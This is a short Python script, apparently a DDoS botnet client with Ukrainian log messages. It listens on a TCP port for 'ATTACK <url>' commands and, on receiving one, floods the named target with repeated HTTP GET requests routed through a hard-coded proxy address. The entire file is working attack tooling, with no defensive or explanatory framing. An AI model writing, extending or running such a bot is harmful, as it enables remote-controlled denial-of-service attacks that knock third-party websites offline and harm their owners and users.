import requests
import socket
import threading
import time

listen_port = 5000
proxies = {
    "http": "http://181.65.121.34:8080",
    "https": "https://181.65.121.34:8080"
}

def listen_for_commands():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', listen_port))
        s.listen(1)
        print(f"[{time.ctime()}] Бот слухає на порту {listen_port}...")
        while True:
            conn, addr = s.accept()
            with conn:
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    command = data.decode()
                    if command.startswith("ATTACK"):
                        target = command.split(" ")[1]
                        attack_target(target)
                    conn.send(f"[{time.ctime()}] Отримано: {command}".encode())

def attack_target(target):
    while True:
        try:
            response = requests.get(target, timeout=10, proxies=proxies)
            if response.status_code == 200:
                print(f"[{time.ctime()}] Успіх на {target}")
            else:
                print(f"[{time.ctime()}] Помилка на {target} зі статусом {response.status_code}")
        except Exception as e:
            print(f"[{time.ctime()}] Помилка на {target}: {e}")
        time.sleep(0.5)

if __name__ == "__main__":
    threading.Thread(target=listen_for_commands, daemon=True).start()
    while True:
        time.sleep(1)
